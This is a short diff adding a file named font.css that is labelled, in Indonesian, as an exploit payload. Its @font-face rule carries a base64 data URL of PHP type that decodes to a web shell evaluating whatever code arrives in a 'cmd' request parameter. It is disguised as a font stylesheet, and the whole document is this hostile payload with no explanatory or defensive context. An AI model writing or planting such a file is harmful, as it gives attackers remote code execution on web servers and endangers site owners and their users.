@@ -1,0 +1,5 @@
+/* font.css - Payload untuk exploit */
+@font-face {
+    font-family: 'pwn';
+    src: url('data:application/x-php;base64,PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsgPz4=');
+}
